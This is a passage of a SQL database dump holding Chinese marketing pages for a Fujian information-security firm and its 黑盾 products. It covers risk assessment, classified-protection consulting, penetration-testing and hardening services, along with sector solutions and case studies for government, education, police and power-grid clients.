20984-2007）及等级保护系列规范，遵循ISO27001以及相关行业规范，从安全技术和安全管理两个层面入手，全面深入分析信息系统存在的脆弱性、威胁和风险，输出风险评估报告和风险处置建议。并进一步协助用户完成安全规划，有步骤有计划的提升用户的信息安全保障水平。海峡信息风险评估服务根据服务内容不同，可以分解为网络安全评估、网站安全评估、应用系统安全评估等多种类型。$$$认识风险及其对目标的潜在影响、\r\n为决策者提供信息、\r\n有助于认识风险，以便帮助选择应对策略、\r\n识别那些造成风险的主要因素，揭示系统和组织的薄弱环节、\r\n有助于明确需要优先处理的风险事件、\r\n有助于通过事后调查来进行事故预防、\r\n有助于风险应对策略的选择、\r\n满足监管要求。','/uploads/img1/20170616/59439c3fb1aa2.png','');
INSERT INTO `xyh_page_detail` VALUES ('9','89','等级保护咨询服务','等级保护制度是我国信息安全保障体系的基本制度，2007年公安部等四部委联合发布了《关于开展全国重要信息系统安全等级保护定级工作的通知》（公信安[2007]861号），明确了重要信息系统等级保护工作的开展。','客户需求$$$服务介绍$$$ 等级保护建设差距分析服务$$$等级保护安全整改与加固服务阶段$$$ 等级保护测评辅助服务阶段$$$ 等级保护管理体系建设服务阶段$$$为什么选择海峡信息','1、政策需求——符合等级保护的要求\r\n     --  完成系统定级并备案\r\n     --  系统达到《基本要求》相应级别的指标\r\n     --  符合《测评准则》要求，并通过测评\r\n2、   实际需求——满足安全实际要求\r\n     --  融合现有的安全体系或安全设施\r\n      --  满足客户的其他符合性要求，如行业标准等\r\n      --  适应业务特征与安全要求的差异性\r\n      --  整体考虑，统一建设与管理\r\n      --  建立长效机制，可持续运行、发展和完善$$$海峡信息等保咨询服务从安全管理和安全技术两大方面的十个控制类中进行等级保护建设和整改咨询服务，海峡信息把等级保护建设过程分解为4个子服务：$$$等级保护建设项目首先要进行重要信息系统的定级和备案工作。然后针对定级备案系统所在的网络环境开展资产整理、风险评估、渗透测试等工作，以分析信息系统当前风险状况，以明确等级保护整改需求和重点。差距分析服务会输出等级保护需求分析、方案设计、项目规划、安全措施选择与选型等内容，等级保护差距分析服务是等级保护整改与加固的基础，也可以单独购买。$$$等级保护安全加固服务包括重要信息系统相关的网络结构化设计，网络设备安全防护加固，服务器主机安全加固，数据库系统安全加固，中间件系统安全加固，应用服务漏洞检测与加固服务等加固工作。安全加固服务能够有效的加强等级保护的网络安全设备防护、主机安全的大部分控制点以及应用安全漏洞修复方面起到重要作用。$$$ 重要信息系统整改完毕后，执行一次完整的等级保护差距复查服务，按照等级保护基本要求和等级保护测评准则实施自我预测评工作，并根据测评结果弥补缺漏，为申请测评做准备。测评辅助服务还包括在等级保护测评前，海峡信息协助用户完成等级保护的重要信息系统的定级和备案工作。在等级保护测评过程中，海峡信息协助用户为测评机构提供测评数据，辅助测评工作的顺利开展。$$$ 根据等级保护安全管理基本要求，为重要信息系统建立起信息安全策略、方针、各项安全管理制度、安全操作规范以及各类操作记录文档体系，使信息化管理能够在等级保护要求的管理体系下长期稳定运行。$$$丰富的经验：海峡信息作为福建省唯一以信息安全为主营业务的企业，参与大量等级保护相关研究和实践工作、\r\n专业的团队：经验丰富的专业服务人员，规范化的服务交付能力、\r\n深厚的资质：福建省卫生行业信息安全等级保护专家组中唯一的一个企业化单位.','/uploads/img1/20170616/59439cd76ce31.PNG','1.已经通过等级保护测评的客户信息系统：科技厅科技项目管理系统、台湾文献信息系统、农业厅外网网站系统、五有系统、公务员局公务员招考系统、福州海关运行网信息系统<p class=\"publicp cg\">2.服务中的三级系统 ：政务外网云计算平台、福建省附属第一医院信息系统、 福建省中山医院信息系统、 福建省财政厅、 福建省立医院 、龙岩市第一医院、 厦门大学附属第一医院、福建协和医院</p>');
INSERT INTO `xyh_page_detail` VALUES ('10','90','渗透测试服务','渗透测试是一种全新的安全防护思路，将安全防护从被动转换成了主动。正是因为看到了这一点，很多重点行业的企业越来越多地通过独立的第三方安全机构来进行“渗透测试”，以求更好的安全防护效果。\r\n\r\n        随着电子商务、电子政务的发展，越来越多重点单位和企业在安全上投入了巨大的精力和资金，但有时候用户会有这样的感受：当基本的软硬件设施配置好之后，安全防卫水平就到了一个相对的瓶颈，再加大投入并不能明显提高安全水平。实际上，这种“安全玻璃天花板”在很多行业和企业中都存在，而“渗透测试” 成为了解决这个问题的新角度之一。','客户需求$$$服务介绍$$$测试方法$$$渗透目标$$$客户价值','自动化扫描可能存在误报或是漏报；\r\n自动化扫描可能很全面，但是却不够深入；\r\n急需一种辅助的方法与自动化扫描相结合，更好的评估系统。$$$渗透测试为纯人工的安全漏洞挖掘过程，通过模拟恶意黑客的攻击方法，来评估计算机网络系统安全的一种服务。在该过程中，海峡信息安全研究专家通过其已经掌握的攻击方法，对系统的任何弱点、技术缺陷和漏洞进行全面、深入和扩大化的主动分析。$$$黑箱测试：完全模拟黑客的入侵方式来进行渗透测试、\r\n白盒测试：测试者可以通过正常渠道向被测单位取得各种资料来进行渗透测试$$$操作系统渗透：对Windows、Solaris、AIX、Linux、等操作系统本身进行渗透测试。\r\n数据库系统渗透：对MS-SQL、Oracle、MySQL、等数据库应用系统进行渗透测试。\r\n应用系统渗透： 对渗透目标提供的各种应用，如ASP、CGI、JSP、PHP等组成的WWW应用进行渗透测试。\r\n网络设备渗透： 对各种防火墙、入侵检测系统、网络设备进行渗透测试。$$$ 深度挖掘计算机网络系统中的安全漏洞，并判断漏洞可能造成的最大限度的损失；\r\n以最真实的测试方法，让客户体验计算机网络系统遭受黑客入侵时的措手不及，以便及早防护；\r\n以最权威的客户数据，让客户感受计算机网络系统安全漏洞将带来的影响和损失，以便做好安全损失与保护的评估','','');
INSERT INTO `xyh_page_detail` VALUES ('11','91','安全加固优化服务',' 由于功能复杂，代码庞大，计算机操作系统、数据库系统在设计上存在一些安全漏洞和一些未知的“后门”，一般情况下很难发现，同时由于系统的配置不当也会带来 安全隐患，是黑客攻击得手的关键因素。因此，信息系统在投入使用前和使用中，都需要对操作系统、数据库系统等进行安全加固，以提高系统安全防范能力，减少安全事件的发生。\r\n\r\n        安全加固是配置软件系统的过程，针对服务器操作系统、数据库及应用中间件等软件系统，通过打补丁、强化帐号安全、加固服务、修改安全配置、优化访问控制策 略、增加安全机制等方法，堵塞漏洞及“后门”，合理进行安全性加强，提高其健壮性和安全性，增加攻击者入侵的难度，软件系统安全防范水平得到大幅提升。\r\n','客户需求$$$服务介绍$$$客户价值','为什么针对信息业务系统入侵事件频繁发生？\r\n为什么信息业务系统恢复后威胁仍然存在？\r\n为什么已经部署了安全设备但被黑事件还会出现？\r\n如何全面了解企业信息业务系统安全脆弱性状况？\r\n如何建立完善的安全加固机制？\r\n通过什么方法去发现和修补这些风险和漏洞？$$$海峡信息安全研究团队具有专业的网络策略研究、操作系统安全、数据库安全、Web应用安全相关的专业技术人员，能够协助用户在风险可控的条件下对信息系统开展安全加固和安全优化服务。$$$提升信息系统安全防护水平；\r\n堵塞漏洞减少网络攻击安全事件；\r\n防止系统入侵安全隐患再次被黑客利用；\r\n避免企业再次遭受黑客入侵的安全威胁；\r\n帮助企业客户建立完善的安全加固机制；\r\n最大限度降低信息安全运维成本。','/uploads/img1/20170616/59439e0e24ff1.png|||/uploads/img1/20170616/59439e20ec371.PNG','');
INSERT INTO `xyh_page_detail` VALUES ('12','92','安全监控服务','现如今，web应用安全产品五花八门。但其产品尚不能完整的覆盖WEB应用安全的生命周期，当前的安全防护方案仍缺少一套行之有效的长效安全保障措施。网站安全监测服务则是 为了完善WEB应用安全保障机制而存在的。通过网站安全监测服务与现有的WEB应用安全防护技术、防护产品、安全策略有机的整合，从而形成长效的WEB应用安全保障机制。网页挂马、SQL注入攻击和 XSS 跨站脚本攻击已经成为木马、病毒传播的主要途径之一。由于各种系统漏洞和软件漏洞的存在，因此通过入侵进行挂马的数量会继续增加。同时黑客通过SQL注入攻击或 XSS 跨站脚本攻击等手法入侵网站系统，从而篡改网站网页或数据库的内容，甚至植入各种各样的下载脚本代码。用户只要浏览被植入木马的网站，如果用户的操作系统存在漏洞就会遭遇木马入侵，从而造成个人信息泄露和财产损失。','客户需求$$$服务介绍$$$客户价值','实时远程安全监控服务，在第一时间检测到网站的安全问题\r\n无需安全任何软件或调整网络架构，无需购买和部署设备，在几小时内就可以检测服务投入运行\r\n专业的技术指导协助我及时消除安全威胁$$$海峡信息网站安全监控系统，旨在帮助政府、企业和关注WEB安全的机构组织大规模、周期性检测网站已有的安全漏洞和安全隐患，使用户深入了解网站的安全现状和安全发展趋势，帮助用户在网站系统被恶意入侵前有效地对薄弱环节进行有针对性的修补。\r\n$$$海峡安全监测服务平台用于对广大用户群体提供远程安全监测服务。用户无需安装任何软件或调整网络架构，由于无需购买和部署设备，因此用户可以在几个小时内将监测服务投入运行，海峡信息将在第一时间将监测到的网站安全问题及时通报给用户，并给予专业的技术指导协助用户及时消除安全威胁。\r\n','/uploads/img1/20170616/59439e788e2f3.PNG','');
INSERT INTO `xyh_page_detail` VALUES ('13','94','安全咨询服务',' 随着社会信息化程度越来越高，企业的生存和发展越来越依赖于多方面的信息技术以及对信息技术的管理。信息技术的管理涉及信息安全管理体系咨询、IT治理、IT内部控制、IT规划、信息安全风险评估、业务连续性、IT服务管理、开发安全和运维等多方面领域。','服务介绍$$$客户价值','海峡信息基于自有知识产权的IT风险管理与控制框架，结合对信息技术与信息安全相关标准/模型/规范的深刻理解，为客户提供一系列信息科技风险咨询服务，说明客户逐步将管理流程融入到日常行为中，更加有效地发挥管理体系的作用，并协助企业主动识别改进机会，持续提升管理体系价值。$$$从外部审视企业，全面了解企业安全现状、\r\n解决企业实际存在的安全问题、\r\n增强企业抗击安全威胁的能力、\r\n更新企业员工安全意识。','','');
INSERT INTO `xyh_page_detail` VALUES ('14','43','电子政务系统行业安全应用解决方案','电子政务是国家信息化服务能力的体现，是政府进行管理、决策和服务的重要手段。电子政务信息系统通过政务信息网、政务外网、政务专网和互联网提供服务，必然会遭遇来自恐怖集团、敌对势力、捣乱分子的安全威和网络攻击。伴随近年愈演愈烈的网络安全态势，承载着众多电子政务信息系统和政务数据、作为电子政务信息原点和数据交换平台的电子政务数据中心，面临着严唆的安全挑战。如何规划和建设安全的政务数据中心，成为电子政务建设工作中的难点课题。','背景与需求$$$设计架构$$$用户价值','数据中心作为电子政务信息原点和数据交换平台，网络系统湲盖范围大，涉及的用户面广，业务应用众多而且复杂，还需要与相关网络互联。因此，其可能面临多方面的信息安全技术风睑，经过总结分析主要包括了以下几类：网络层安全风险，包括来自网络层拒绝服务攻击、网络嗅探你造、网络懦虫病毒、非授权的网络访问、非法接人和违规外联等安全问题带来的技术风险；主机层安全风险，\r\n包括操作系统和数据厍的系统漏洞，系统软件的安全策略缺陷，违规特权操作、数据篡改、系统操作审计曰志缺失、审计曰志可读性差等问题带来的技术分险；应用层安全风险，包括应用系统软件漏洞，包括SQL注人、XSS跨站、Cookie注人、应用层拒绝服务CC攻击、网页篡改、暗链攻击、网站爬虫在内的黑客攻击，违规特权操作，数据篇改、系统操作审计曰志缺失、审计曰志可读性差等问题带来的技术风险；$$$海峡信息政务数据中心安全技术防护解决方案，是根据《国家电子政务总体框架》、《电子政务信息共享互联互通平台总体框架技术指南》和国家信息系统等级保护相关要求，结合海峡信息多年的行业经验形成的安全技术体系解决方案。\r\n针对庞大而复杂的政务数据中心，首先进行安全区域设计，划分为：政务接人区、核心交换区、运维管理区、核心业务区、核心数据区等5大安全区域；进而从网络层、主机层、应用层等方面，设计各安全区域进行安全防护策略措施，达到整体统一的安全防护效果。$$$海峡信息政务数据中心安全技术防护解决方案，以“ 分区分域 纵深防御” 为核心，重点防护和保障政务数据中心的关键业务安全；\r\n落实网络层、主机层、应用层、数据层和物理层五大层次的安全技术措施设计，从“访问控制”“入侵防范”“通信保密”“恶意代码防范” “篡改恢复” “安全审计”等方面，完善政务数据中心信息安全基础设施建设工作，做到“进不来”“拿不走”“看不懂”“改不了” “走不脱”；\r\n能够有效满足政务数据中心的安全需求，符合等级保护标准和相关规范要求，动态感知数据中心安全态势，主动防御来自内外网络攻击，提升政务数据中心的安全防护能力。','/uploads/img1/20170702/595891516ffa8.jpg','');
INSERT INTO `xyh_page_detail` VALUES ('15','45','教育行业信息化安全建设解决方案','校园网的建立不仅是网络硬件和应用的建立，因此还应重视校园网的安全问题。事实上，校园网安全和企业网、政府网和公众网的安全一样重要。网络安全是一个体系结构，涉及整个办公环境的各个方面，包括人员和设备，包括信息的驻留点以及沿途经过的各个中间环节，从物理层到应用层都要小心对待。 Internet的普及以及今天校园教学、科研和办公等多方面的应用对Internet的依赖都促使校园网应该增强实施安全的措施。\r\n校园网络的安全一般分为内部网络安全和外部网络安全。内部网络安全涉及校园网内部建网的网络设备，而外部网络安全主要针对防火墙。通过对已建校园网的大中专院校、中小学校的调查发现，校园网络的安全问题已经成为威胁到信息技术教育进一步推进的首要问题，和互联网所经受的考验一样，病毒、攻击和各种各样的不健康信息以其越来越大的危害侵蚀着学校这片净土。简而言之，校园网的安全问题主要体现在以下几个方面：网络攻击、不健康信息、病毒、 IP盗用。\r\n\r\n鉴于教育行业各院校网络结构的复杂性和多样性，我们以成功实施的福建某学院为例，阐述“黑盾”系列安全产品为教育行业建立的解决方案。','安全需求分析$$$图书馆安全防护方案$$$图书馆安全防护价值','高校图书馆网络肩员着整个图书馆系统正常运行、电子阅览室正常使用、馆藏数字资源的正常获取利用、文献检索实习课的正常教学等重要任务，甚至还涉及到学生的缴费金额，图书馆网络一旦瘫痪，可以说图书馆的所有业务即将被迫停止。鉴于图书馆的重要性，作为图书馆网络中的技术人员，必须加强防范意识，加强自身专业技能的培训，不断学习、互相切磋、共同研究，形成一支高品质、高水平的科研团队。$$$根据上述图书馆网络建设中出现的问题与需求，海峡信息凭借丰富的图书馆网络安全建设经验，提出了高安全、高性能、易管理的高校图书馆网络安全解决方案。包括边界防护建设、VPN接人建设 、人侵防御建设 、上网行为管理建设 、WEB应用防护建设。$$$海峡信息高校数字图书馆整体安全解决方案帯来的价值：\r\n1、  提供安全的网络边界防护，做到信任授权级别的安全接人；\r\n2、  提供高效的信息共享方式一一VPIN技术，让教职工在家或出差时，在学生在署寒假时，安全便捷接入图书馆网络；\r\n3、  实现终端用户安全绿色上网，符合绿色校园网络建设的需求；\r\n4、  实现对各类WEB应用服务器的安全防护，通过事先、事中、事后三位一体的安全防护体系，对来自应用层的动态攻击进\r\n行全面的检测、防护以及过滤，保护高校图右馆业务的正常运行。\r\n5、  提供细粒度用户管理、全面的流量管控、精细化的应用可视化管控及攻击行为可视化的整体解决方案','/uploads/img1/20170702/5958955df26b6.jpg','');
INSERT INTO `xyh_page_detail` VALUES ('16','46','农科院从黑盾系列安全产品中获益良多','福建农业科学院成立于 1960 年。全院现设有 13 个研究所，即：稻麦、果树、甘蔗、茶叶、植物保护、土壤肥料、畜牧兽医、耕作轮作、地热农业利用、农业科技情报研究所和红萍研究中心、生物技术研究中心、中心化验室。在职职工 1065 人，其中有高级科技人员 185 名、中级科技人员 264 名，国家级专家 4 名，省级专家 11 名。全院以应用研究和开发研究为主，适当开展应用基础研究。在作物育种、畜牧及畜禽饲料、生物农药、植物保护、台湾农业等研究领域具有较强科技力量，水稻育种、红萍、柑桔黄龙病等研究居国际领先水平，设有国家龙眼枇杷资源圃和省农业遗传工程重点开放实验室，目前全院承担国家 863 高科技攻关、国家基金和部省级重点课题等各类课题 100 多项。\r\n\r\n此外，农科院还承担福建省农业科技信息网的建设，该网的建立旨在省农科院丰富的科技资源的基础上，采集、分析、加工、发布我省农业政策、经济、科研、推广、教育，尤其是农业技术、成果、市场等信息内容，由省农业科技网提供的网络服务已经广泛应用于农业工作的各个领域。但是另一方面，伴随互联网开放性的发展和福建省农业科技网业务的不断发展，计算机作为一种必不可少的工具，也同时不断出现的网络非法入侵、重要资料被窃取、网络系统瘫痪、系统病毒泛滥等严重问题，成为农业科技网迫在眉睫亟待解决的难题。福建省农业科技网的领导从安全意识角度和网络管理人员在技术防范方面分别对农网的信息整体安全提出新的更高要求。','福建省农业科技网的网络安全设计原则$$$黑盾，立体式防护保安全$$$集中性原则$$$层次性原则$$$服务性原则','福建省农业科技网以农科院为中心，院所相连、省地贯通、国际互联，把农业新技术、新成果、新产品推向国内外市场，促进农业科技转化为现实生产力，加快农业与国际农业接轨进程。网络中心设在省农科院院部大楼四楼，采用 1000M 主干交换的快速以太网组网模式，由网络主干交换机、集线器、服务器、客户机组成星型拓扑结构，系统应用 Intranet/Internet 、 Browser/Server 、 Client/Server 等技术，满足实时信息处理和较高的吞吐能力要求，与 Internet 直接联接，以及在服务器上运行 Proxy 、 WWW 、 Email 、办公、数据库等服务，以高性能的服务器作为整体网络管理服务的核心。通过综合布线联接各相关机构，覆盖院领导、各处、所、室 ( 中心、公司 ) 等，信息网点达 350 个。鉴于农业科技网的特殊性，从安全的重要性和不安全因素及技术手段的角度来制定以下设计原则： \r\n福建省农业科技网内部信息对于全省农业的繁荣发展至关重要、采取有效措施保证信息的机密性、完整性、真实性和可用性。保护数据信息的机密性、完整性和可用性高于一切，是不同层次员工的责任、所有网络通讯信息处理的设备将被用于执行经过授权的任务、未经授权不得随意删除、修改和泄漏信息、利用防火墙技术强迫所有进出的信息都通过一个唯一的检查点，禁止未被允许的服务通过，实施集中安全策略、实施安全理论教育，提高安全意识。$$$为了适应省 科技信息网 迅速发展的形势需要，进一步提高网络安全性，达到建设一个完整、安全和高效的信息系统的目标，特别对网络安全引起高度重视，对系统的高可靠性、可用性、性能和互联都给与充分的考虑，福建省农科院积极地开展了专门的网络和信息安全管理系统的建设。经过仔细挑选，福建省农业科技网选定了福建省海峡信息技术有限公司的“黑盾”系列网络安全产品。$$$“三分技术，七分管理”阐述了网络安全的本质在于管理，而安全管理重在集中。 福建省农业科技网 的设备和类型众多，业务系统也相对复杂。在全网安全方案的设计中，无论是安全管理制度的制定和施行，或是安全产品的选型和实施，还是长期安全服务方案的制定，都需根据集中性原则，目标是实现对各设备和系统的集中安全管理以及安全事件发生后的集中响应，保证服务的最大化正常运行。$$$在 福建省农业科技网 安全方案设计中，无论具体的软硬件部署，还是管理制度的制定，都遵循层次性原则。安全问题的层次性原则集中在两个方面：管理模式的层次性和防护技术的层次性。在 福建省农业科技网 中，由于涉及到众多设备以及地点，需要一种层次性的管理模式。比如，用户管理需要分层次的授权机制；防病毒体系的病毒库分发或报警也需要分层次机制。$$$产品是本，服务是魂。 信息系统的安全状态总是处于不断的变化之中的。这一方面源于安全需求的变化，另一方面也决定于安全威胁的变化。如：用户在使用系统时，如果不按照规范使用、操作，往往会破坏系统的安全状态；新的应用服务系统投入往往会产生新的安全漏洞等，从而对系统的安全状态的造成影响。 安全一向是一个交互的过程，使用任何一种“静态”或者号称“动态”防范的产品都不能解决一直在发展的系统安全问题，海峡信息为福建省农业科技网提供的立体式安全服务，包括设备产品的技术支持和服务以及安全审计、安全响应等专业安全服务等。','','福建省社科院、福建省邮电规划设计院、福建省经济信息中心、福建省农业科学院.');
INSERT INTO `xyh_page_detail` VALUES ('17','47','下一代应用威胁感知与防御解决方案','APT攻击在21世纪开始蓬勃发展起来，有重要信息资产的部门都成为APT指向的目标。2010年的Google Aurora(极光)攻击是一个十分著名的APT攻击，Google的一名雇员点击即时消息中的一条恶意链接，引发了一系列事件导致这个搜索引擎巨人的网络被渗入数月，并且造成各种系统的数据被窃取。2011年3月，EMC公司下属的RSA公司遭受入侵，部分SecurID技术及客户资料被窃取，其后果导致很多使用SecurID作为认证凭据建立VPN网络的公司——包括洛克希德马丁公司、诺斯罗普公司等美国国防外包商——受到攻击，重要资料被窃取。APT攻击已成为最具威胁性的信息安全攻击手段。','网络安全面临变革$$$什么是APT攻击$$$产品设计理念$$$ 智能协议深度识别和分析$$$ 证据库关联分析$$$ 产品主要功能$$$ 部署方式$$$ 用户价值','伴随着APT攻击造成的重大损失的同时，是传统安全监测与防御手段针对APT攻击的无能为力。从国家级的核设施网络到美国NASA，从世界互联网巨头GOOGLE到安全公 司翘楚RSA，无一不是APT攻击的受害者。如果说他们的安全做的不好，那世界上又有几家 能说比他们的安全做的更好呢？ APT剑指之下，没有那个部门能幸免。试想一下，当攻击者可以肆意进出和控制军事指挥系统、核系统、能源系统、交通指挥系统、金融系统，那么除 了信息的安全，我们实体的财产与生命安全，也将变得无比脆弱。在传统的企业安全防御系统中，IDS、IPS、防火墙、安全网关等安全产品并非针对APT的检测、防护而生。所以，原有的防护系统在APT攻击面前起到的作用非常之小。如何在新旧技术交叠应用的变革过程中，更有效地检测和防御系统网络面临的安全问题，已成为各方关注的重点。$$$APT攻击是指容和情报、黑客技术、社会工程等各种手段，针对有价值的信息资产或通过IT系统控制的重要系统，发起复杂而专业的攻击。由于IT系统复杂性，目前还没有很好的检测措施完全发现IT产品中的后门、漏洞以及应用运行时的可信性，APT攻击从渗透进内网到窃取髙价值信息，是一种多阶段多维度的过程。攻击者通过混 合了基于网页、邮件和文档的多种攻击技术，让APT攻击变得难以感知。整个APT攻击过程可归纳为情报收集阶段、攻击阶段、控制阶段和内部扩散阶段四个阶段$$$华创云盾安全威胁检测与防御系统设计目标旨在适应攻防的最新发展，准确监测网络异常流量，第一时间将安全威胁阻隔在企业网络外部。该产品弥补了防火墙、入侵检测等产品的不足，提供动态的、深度的、主动的安全防御，是对现有安全防御体系的很好补充。APT攻击存在一个完整的生命周期，华创云盾安全威胁检测与防御系统针对其整个生命周期里必须使用的技术点进行监控，提供了全方位的未知威胁分析：深度分析已知漏洞攻击和0day攻击，帮助用户发现真正的黑客攻击；通过web、邮件、文件检测系统的配合检测，全方位的发现APT攻击；关联分析能力强，快速识别APT攻击行为；直观展现APT攻击路径，安全威胁可视化。\r\n同时，中信网安提供高级分析服务，对于用户无法确定的攻击行为和攻击样本，可提供高级技术支持，协助用户对攻击进行分析，用以对抗高技术的黑客。$$$协议识别是新一代网络安全产品的核心技术。传统安全产品如防火墙，通过协议端口映射表（或类似技术）来判断流经的网络报文属于何种协议。\r\n但是，事实上，协议与端口是完全无关的两个概念，我们仅仅可以认为某个协议运行在一个相对固定的缺省端口。包括木马、后门在内的恶意程序，以及P2P应用、IMS、网络在线游戏等应用都可以运行在任意一个指定的端口，从而逃避传统安全产品的检测和控制。\r\n系统采用独有的智能协议深度识别技术，通过动态分析网络报文中包含的协议特征，发现其所在协议，然后递交给相应的协议分析引擎进行处理，能够在完全不需要管理员参与的情况下，高速、准确地检测出通过动态端口实施的恶意入侵，可以准确发现绑定在任意端口的各种木马、后门。 $$$利用对多种网络数据的智能协议深度解析和处理引擎，解读流量数据，不断跟踪、记录网络中的网络行为和事件，建立日常行为基准，形成独有的证据库。\r\n通过对证据库进行大数据挖掘分析的基础上，匹配ARTsmart攻击链库，能够将事件从多角度进行智能关联分析，追踪源头，找出隐秘异常行为，发现安全威胁。用户可以通过上钻、下钻操作方式多角度了解攻击事件的流程，及时发现网络中的恶意行为、漏洞、以及攻击等安全隐患，将APT攻击消灭在萌芽期。$$$全方位的检测机制、全面覆盖威胁载体、安全漏洞检测、强大的入侵规则库、热点攻击地图、多种部署模式、关联事件告警管理、多维度证据展示与统计、安全分析报告、丰富的响应方式、高级人工分析$$$系统提供了各种规模的系统全面检测功能，能够在一套解决方案中支持众多环境和众多协议的检测，通过网络旁路监听的方式接入网络，通过在核心交换机上设置端口镜像模式，使安全检测引擎能够监听到所有用户通过交换机进行通讯的所有操作。在实现监控检测功能的同时，完全不改变用户的网络环境，避免设备对用户网络造成中断的风险。$$$黑盾安全威胁检测与防御系统能全面感知APT攻击行为（如ODAY漏洞攻击、高级特马、隐蔽信道），将威胁行为可视化动态展示。通过对证据库进行大数据挖掘分析的基础上，匹配ARTsmart攻击链库，能够将事件从多角度进行智能关联分析，追踪源头，找出隐秘异常行为，发现安全威胁，及时发现网络中的恶意行为、漏洞、以及攻击等安全隐患，将APT攻击消灭在萌芽期。','','');
INSERT INTO `xyh_page_detail` VALUES ('18','48','海峡信息使公安系统免受黑客干扰','海峡信息使公安系统免受黑客干扰\r\n\r\n随着信息化建设的发展，各地政府部门都将如何构建一个安全、高效的网络系统作为政府信息化发展目标之一。某市公安局作为政府行政机构， 90年代就已经开始了网络系统工程的建设，随着业务量的发展，与各机构的信息沟通越发频繁，在实现了系统内部数据信息的及时交流和共享，使网络延伸至下属各派出所，同时 信息系统广泛运行以来就存在信息系统安全问题，来自外单位的威胁、来自系统内网的威胁、来自互联网的威胁、来自黑客攻击的威胁、来自病毒的威胁， 需要确保网络信息安全，以提高办公效率。某市公安局在经过详尽的研究和考证之后，对新的网络提出了以下要求。','系统需求分析$$$黑盾入侵检测系统和黑盾防火墙联动$$$构建公安系统虚拟专用网','建立一个高效安全的网络成为新的网络系统的首要需求。由于公安系统在政府机构中的敏感性和特殊性，安全成为保障信息、数据安全的关键，因此在建立一个稳定的网络实现数据共享、信息互通的同时，如何确保数据和信息的安全成为了网络系统的重要前提。\r\n\r\n使用黑盾防火墙实现各种关键应用服务器与其它所有外部网络的隔离与访问控制，通过配置防火墙安全策略对所有服务器的请求加以过滤，只允许正常通信的数据包到达相应服务器，其它的请求服务在到达主前就遭到拒绝，当网络出现攻击行为或网络受到其它一些安全威胁时，进行实时的检测、监控、报告与预警和及时阻断。同时，当事故发生后，应提供攻击行为的追踪线索及破案依据，有对网络的可控性与可审查性；采用防火墙技术将单位局域网（可信网络）同其他单位网络（不可信网络）隔离开来，并进行相互之间的访问控制与安全审计。\r\n\r\n(a) 访问控制，确保业务系统不被非法访问。 \r\n(b) 数据安全，保证数据库软硬件系统的整体安全性和可靠性，对服务器实时监控。 \r\n(c) 入侵检测，对于试图破坏业务系统的恶意行为能够及时发现、记录，提供非法攻击的犯罪证据,同时对外、内部数据进行监控。 \r\n(d) 应用系统的通讯安全，来自网络内部其他系统的破坏，或误操作造成的安全隐患。$$$IDS 在网络 / 机上检测到入侵或不正常数据后通知黑盾防火墙，黑盾防火墙生成动态规则实现对入侵行为的控制和阻断，如结束当前会话或在一定时段阻断来自特定源的所有连接请求；最后黑盾防火墙将处理结果通知 IDS 。$$$基于 IPSec标准的VPN技术能够很好地实现对远程数据传输进行加密，在公网上建立加密隧道，数据 信息以加密的形式在公网上传输，这样即使第三方截获或窃听到加密的数据，也只是一堆毫无意义的字符，无法了解信息的真实意义。利用黑盾防火墙的VPN功能，各公安局之间交换的数据是在VPN加密隧道中进行传输，使得之间的业务数据传递 能够在网络平台得到更加安全性。 对于移动用户，通过拨号连入的，黑盾防火墙支持其以拨号VPN（VPDN）的形式接入内网，访问授权的数据，实现安全的移动办公。 强大的 VPN（虚拟专用网）功能 黑盾防火墙能根据不同的需求实现不同的VPN功能\r\n','/uploads/img1/20170616/5943a1cbe3fd1.gif|||/uploads/img1/20170616/5943a1e407bc8.gif|||/uploads/img1/20170616/5943a205134d8.gif','福建省交警总队 、福州市公安局 、南平市公安局 、武夷山公安局.');
INSERT INTO `xyh_page_detail` VALUES ('19','49','黑盾“加固”电力二次系统安全防护','电力监控系统及调度数据网作为电力系统的重要基础设施， 其 安全问题一直是国家有关部门关注的重点之一。一方面， 电厂、变电站减人增效，大量采用远方控制，对电力控制系统和数据网络的安全性、可靠性、实时性提出了新的严峻挑战。而另一方面， Internet 技术和因特网已得到广泛使用， E-mail 、 Web 和 PC 的应用也日益普及，但同时病毒和黑客也日益猖獗。黑客在 调度数据网中采用“搭接”的手段对传输的电力控制信息进行“窃听”和“篡改”，进而对电力一次设备进行非法破坏性操作的威胁。电力二次系统 的安全性和可靠性已成为一个非常紧迫的问题。\r\n\r\n根据电力企业的特点，信息安全按其业务性质一般可分为四种：一种为电网运行实时控制系统，包括电网自动发电控制系统及支持其运行的调度自动化系统，火电厂分布控制系统（ DCS ， BMS ， DEH ， CCS ） , 水电厂计算机监控系统，变电所及集控站综合自动化系统，电网继电保护及安全自动装置，电力市场技术支持系统。第二种为电力营销系统，电量计费系统，负荷管理系统。第三种为支持企业经营、管理、运营的管理信息系统。第四种为不直接参与电力企业过程控制、生产管理的各类经营、开发、采购、销售等多种经营公司。 海峡信息公司通过对电力二次系统 特点、目前状况和安全要求的 深刻理解，根据 《 全国电力二次系统安全防护总体方案》的要求，采用公司的核心产品黑盾防火墙、黑盾网络入侵检测系统和黑盾 VPN 设备，对 整个二次系统 分为四个安全工作区，进行总体的安全防护策略部署：实时控制区（安全区Ⅰ）、非控制生产区（安全区Ⅱ）、生产管理区（安全区Ⅲ）、管理信息区（安全区Ⅳ）。','电力行业安全整体防护解决方案$$$安全防护目标$$$双重安全闸门，双重安全保障$$$安全的身份认证$$$数据备份$$$通信安全$$$ 文件安全$$$数据库安全$$$安全审计','电力二次系统安全防护总体如图所示$$$ 防止通过外部边界发起的攻击和侵入，尤其是防止由攻击导致的一次系统的事故以及二次系统的崩溃；\r\n\r\n•  防止未授权用户访问系统或非法获取信息和侵入以及重大的非法操作。\r\n\r\n•  分区防护、突出重点。根据系统中的业务的重要性和对一次系统的影响程度进行分\r\n\r\n区，重点保护电力实时控制以及生产业务系统。\r\n\r\n•  所有系统都必须置于相应的安全区内，纳入统一的安全防护方案；\r\n\r\n•  系统的安全区间隔离。安全区Ⅰ与安全区Ⅱ之间允许采用逻辑隔离；安全区Ⅰ、Ⅱ\r\n\r\n与安全区Ⅲ、Ⅳ之间隔离水平必须接近物理隔离。\r\n\r\n•  网络隔离。电力调度数据网 SPDnet 与电力数据通信网 SPTnet 实现物理隔离， SPDnet\r\n\r\n提供 二个相互 逻辑隔离的 MPLS- VPN 分别与 安全区 Ⅰ和 安全区 Ⅱ进行通信 。\r\n\r\n•  纵向防护。安全区Ⅰ、 Ⅱ的纵向边界应该部署 IP 认证加密装置； 安全区Ⅲ、Ⅳ 的纵\r\n\r\n向边界应该部署硬件防火墙。$$$安全区 I 